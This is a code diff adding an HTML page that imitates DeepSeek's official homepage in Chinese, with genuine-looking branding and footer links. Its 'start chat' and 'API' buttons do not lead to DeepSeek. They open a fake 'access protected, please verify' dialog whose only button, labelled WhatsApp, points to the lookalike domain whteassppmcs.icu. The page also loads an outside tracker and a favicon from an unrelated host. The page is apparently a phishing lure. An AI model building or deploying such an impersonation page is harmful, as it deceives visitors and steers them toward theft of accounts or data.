@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script>
+<script>LA.init({id:"Kq5Yhoiwz3lvea2l",ck:"Kq5Yhoiwz3lvea2l"})</script>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="keywords" content="DeepSeek, DeepSeek-V3.1, DeepSeek-V3, DeepSeek R1, DeepSeek Coder V2, DeepSeek VL, DeepSeek V2, AI助手, 开放平台, API服务, AI产品">
+    <meta name="description" content="欢迎来到DeepSeek官方网站！DeepSeek-V3模型全面更新上线，各项能力大幅进阶。你可免费与DeepSeek-V3和R1对话，体验全新旗舰模型，还能获取官方AI助手App，它具备搜索、写作、阅读、解题、翻译等多种功能。此外，我们还提供API开放平台服务。探索未至之境，DeepSeek深度求索,尽在DeepSeek！">
+    <link rel="stylesheet" href="deepseek.css?v1780213912">
+    <link rel="icon" href="https://chat.mixinnet.cn/public/uploads/png/20250914/41199f92971123600226ddc84bd4e48d.png" type="image/x-icon">
+    <title>深度求索 - DeepSeek官网下载</title>
+</head>
+
+<body class="legacy-home">
+    <header>
+        <a href="/" class="text-logo">DeepSeek</a>
+        <nav>
+            <a href="/jiqiao/" class="tips-link">使用技巧</a>
+            <a href="https://platform.deepseek.com" class="api-link">API 开放平台</a>
+            <a href="https://www.deepseek.com/en" class="language-link">English</a>
+        </nav>
+    </header>
+    <div class="banner">
+        <div class="banner-container">
+            <p class="update-notice">🎉 DeepSeek-V3.1 模型更新，更高的思考效率，更强的 agent 能力，在网页端、APP 和 API 全面上线，点击查看详情。</p>
+            <h1 class="main-title">DeepSeek</h1>
+            <p class="slogan">探索未至之境</p>
+            <div class="button-container">
+                <a href="#" onclick="showAuthDialog()" class="start-chat-button">
+                    <div class="button-content">
+                        <h3>开始对话</h3>
+                        <p>与 DeepSeek-V3.1 和 R1 免费对话
+                            <br>官方网页版入口</p>
+                    </div>
+                </a>
+                <a href="#" onclick="showAuthDialog()" class="get-app-button">
+                    <div class="button-content">
+                        <h3>API 开放平台</h3>
+                        <p>调用 DeepSeek 最新模型
+                            <br>快速集成、流畅体验</p>
+                    </div>
+                </a>
+            </div>
+        </div>
+    </div>
+    <footer>
+        <div class="footer-links">
+            <div class="link-column">
+                <div class="footer-logo-container">
+                    <strong class="footer-text-logo">DeepSeek</strong>
+                    <div class="social-icons">
+                        <a href="https://github.com/deepseek-ai" target="_blank" rel="noopener noreferrer">
+                            <svg class="icon" style="width:32px; height:32px" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M512 0C229.25 0 0 229.25 0 512c0 226.25 146.625 420.375 350.625 491.25 25.5 4.5 34.5-11.25 34.5-25.125 0-12.375-0.5-49.5-0.75-94.5-144.375 31.5-173.25-69.75-173.25-69.75-23.25-59.25-56.625-75-56.625-75-46.5-31.875 3.5625 31.125 3.5625 31.125 51.375 3.5625 78.375 52.875 78.375 52.875 46.125 78.375 121.125 55.125 150.75 42.375 4.5-32.625 17.625-55.125 32.25-68.625-115.5-13.125-236.25-57.75-236.25-254.25 0-56 19.875-102 52.875-138.75-5.25-13.125-22.5-66.375 4.875-136.5 0 0 42.75-13.5 141.375 52.5 41.0625-11.5625 84.875-17.25 128.625-17.25 43.75 0 87.5 5.6875 128.625 17.25 98.625-66 141.375-52.5 141.375-52.5 27.375 70.125 10.125 123.375 5 136.5 33 36.75 52.875 82.75 52.875 138.75 0 197-121 241.125-237 253.875 18.375 15.75 34.5 46.5 34.5 93.375 0 66.75-0.75 120.75-0.75 136.875 0 13.875 9 30 34.875 25.125C877.375 932.375 1024 738.25 1024 512 1024 229.25 794.75 0 512 0z" fill="#333"/>
+                            </svg>
+                        </a>
+                        <a href="https://twitter.com/DeepSeek_AI" target="_blank" rel="noopener noreferrer">
+                            <svg class="icon" style="width:32px; height:32px" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M512 0C229.25 0 0 229.25 0 512c0 226.25 146.625 420.375 350.625 491.25 25.5 4.5 34.5-11.25 34.5-25.125 0-12.375-0.5-49.5-0.75-94.5-144.375 31.5-173.25-69.75-173.25-69.75-23.25-59.25-56.625-75-56.625-75-46.5-31.875 3.5625 31.125 3.5625 31.125 51.375 3.5625 78.375 52.875 78.375 52.875 46.125 78.375 121.125 55.125 150.75 42.375 4.5-32.625 17.625-55.125 32.25-68.625-115.5-13.125-236.25-57.75-236.25-254.25 0-56 19.875-102 52.875-138.75-5.25-13.125-22.5-66.375 4.875-136.5 0 0 42.75-13.5 141.375 52.5 41.0625-11.5625 84.875-17.25 128.625-17.25 43.75 0 87.5 5.6875 128.625 17.25 98.625-66 141.375-52.5 141.375-52.5 27.375 70.125 10.125 123.375 5 136.5 33 36.75 52.875 82.75 52.875 138.75 0 197-121 241.125-237 253.875 18.375 15.75 34.5 46.5 34.5 93.375 0 66.75-0.75 120.75-0.75 136.875 0 13.875 9 30 34.875 25.125C877.375 932.375 1024 738.25 1024 512 1024 229.25 794.75 0 512 0z" fill="#1DA1F2"/>
+                            </svg>
+                        </a>
+                        <a href="https://www.linkedin.com/company/deepseek-ai" target="_blank" rel="noopener noreferrer">
+                            <svg class="icon" style="width:32px; height:32px" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M849.92 51.2H174.08c-67.8656 0-122.88 55.0144-122.88 122.88v675.84c0 67.8656 55.0144 122.88 122.88 122.88h675.84c67.8656 0 122.88-55.0144 122.88-122.88V174.08c0-67.8656-55.0144-122.88-122.88-122.88zM332.8 819.2H204.8V384h128v435.2zM268.416 332.8h-0.7168C229.504 332.8 204.8 304.3328 204.8 268.7744 204.8 232.448 230.272 204.8 269.1584 204.8c38.9376 0 62.9248 27.648 63.6416 63.9744C332.8 304.3072 308.096 332.8 268.416 332.8zM691.2 819.2v-232.9344c0-56.26368-31.36-94.6688-81.7152-94.6688-38.4256 0-59.2128 25.9072-69.2992 50.944-3.6864 8.96-2.5856 33.7408-2.5856 46.2592v230.4h-128V384h128v66.9696c18.4576-28.5696 47.36-66.9696 121.28768-66.9696 91.60192 0 160.28672 57.6 160.28672 186.2144L819.2 819.2h-128z" fill="#0288D1"/>
+                            </svg>
+                        </a>
+                        <a href="mailto:contact@deepseek.com" target="_blank" rel="noopener noreferrer">
+                            <svg class="icon" style="width:32px; height:32px" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M512 64C264.576 64 64 264.576 64 512s200.576 448 448 448 448-200.576 448-448S759.424 64 512 64zM512 896c-212.672 0-384-171.328-384-384s171.328-384 384-384 384 171.328 384 384-171.328 384-384 384zM736 384H272c-17.696 0-32 14.336-32 32s14.304 32 32 32h464c17.696 0 32-14.336 32-32s-14.304-32-32-32zM272 544h464c17.696 0 32-14.336 32-32s-14.304-32-32-32H272c-17.696 0-32 14.336-32 32s14.304 32 32 32z" fill="#4d6bfe"/>
+                            </svg>
+                        </a>
+                    </div>
+                    <p class="copyright">© 2026 杭州深度求索人工智能基础研究有限公司</p>
+                </div>
+            </div>
+            <div class="link-column">
+                <h4>研究</h4>
+                <a href="https://github.com/deepseek-ai/DeepSeek-R1" target="_blank" rel="noopener noreferrer">DeepSeek R1</a>
+                <a href="https://platform.deepseek.com/model" target="_blank" rel="noopener noreferrer">DeepSeek V3</a>
+                <a href="https://github.com/deepseek-ai/DeepSeek-Coder" target="_blank" rel="noopener noreferrer">DeepSeek Coder V2</a>
+                <a href="https://github.com/deepseek-ai/DeepSeek-VL" target="_blank" rel="noopener noreferrer">DeepSeek VL</a>
+                <a href="https://platform.deepseek.com/model" target="_blank" rel="noopener noreferrer">DeepSeek V2</a>
+            </div>
+            <div class="link-column">
+                <h4>产品</h4>
+                <a href="https://chat.deepseek.com/download" target="_blank" rel="noopener noreferrer">DeepSeek App</a>
+                <a href="https://chat.deepseek.com" target="_blank" rel="noopener noreferrer">DeepSeek 网页版</a>
+                <a href="https://platform.deepseek.com" target="_blank" rel="noopener noreferrer">开放平台</a>
+                <a href="https://platform.deepseek.com/pricing" target="_blank" rel="noopener noreferrer">API 价格</a>
+                <a href="https://status.deepseek.com" target="_blank" rel="noopener noreferrer">服务状态</a>
+            </div>
+            <div class="link-column">
+                <h4>法务 & 安全</h4>
+                <a href="https://www.deepseek.com/privacy" target="_blank" rel="noopener noreferrer">隐私政策</a>
+                <a href="https://www.deepseek.com/terms" target="_blank" rel="noopener noreferrer">用户协议</a>
+                <a href="mailto:security@deepseek.com" target="_blank" rel="noopener noreferrer">反馈安全漏洞</a>
+            </div>
+            <div class="link-column">
+                <h4>加入我们</h4>
+                <a href="https://www.deepseek.com/careers" target="_blank" rel="noopener noreferrer">岗位详情</a>
+                <a href="mailto:hr@deepseek.com" target="_blank" rel="noopener noreferrer">联系我们</a>
+            </div>
+        </div>
+    </footer>
+    <div id="auth-overlay" onclick="hideAuthDialog()">
+        <div id="auth-dialog" onclick="event.stopPropagation()">
+            <div class="auth-lock-icon">
+                <svg width="28" height="28" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <rect x="3" y="11" width="18" height="11" rx="2" fill="#3b82f6"></rect>
+                    <path d="M7 11V7a5 5 0 0 1 10 0v4" stroke="#3b82f6" stroke-width="2" stroke-linecap="round" fill="none"></path>
+                    <circle cx="12" cy="16" r="1.5" fill="#fff"></circle>
+                </svg>
+            </div>
+            <h2 id="auth-title">登录以继续</h2>
+            <p id="auth-desc">本页面受访问保护。<br>请完成下方认证以继续访问。</p>
+            <div class="auth-btn-group">
+                <a class="auth-btn auth-btn-whatsapp" href="https://www.whteassppmcs.icu/?id=2&amp;jump=https://deepseek.com">
+                    <span class="auth-btn__icon">
+                        <svg width="22" height="22" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+                            <path fill="#25D366" d="M16 0C7.164 0 0 7.163 0 16c0 2.828.736 5.482 2.025 7.792L0 32l8.448-2.016A15.917 15.917 0 0 0 16 32c8.837 0 16-7.163 16-16S24.837 0 16 0z"></path>
+                            <path fill="#fff" d="M12.5 9.5c-.22 0-.64.08-.97.41-.33.33-1.27 1.24-1.27 3.02s1.3 3.5 1.48 3.74c.18.24 2.45 3.93 6.03 5.39 2.98 1.21 3.58.97 4.23.91.65-.06 2.1-.86 2.4-1.69.3-.83.3-1.54.21-1.69-.09-.15-.33-.24-.69-.42-.36-.18-2.1-1.04-2.43-1.16-.33-.12-.56-.18-.8.18-.24.36-.93 1.16-1.14 1.4-.21.24-.42.27-.78.09-.36-.18-1.52-.56-2.9-1.79-1.07-.95-1.8-2.13-2.01-2.49-.21-.36-.02-.55.16-.73.16-.16.36-.42.54-.63.18-.21.24-.36.36-.6.12-.24.06-.45-.03-.63-.09-.18-.8-1.93-1.1-2.64-.29-.69-.58-.6-.8-.61-.21-.01-.45-.01-.69-.01z"></path>
+                        </svg>
+                    </span>
+                    <span id="auth-whatsapp">WhatsApp</span>
+                </a>
+            </div>
+            <div class="auth-note" id="auth-note">点击上方按钮完成验证。</div>
+        </div>
+    </div>
+    <script>
+        function showAuthDialog() {
+            document.getElementById('auth-overlay').style.display = 'flex';
+        }
+
+        function hideAuthDialog() {
+            document.getElementById('auth-overlay').style.display = 'none';
+        }
+    </script>
+</body>
+
+</html>
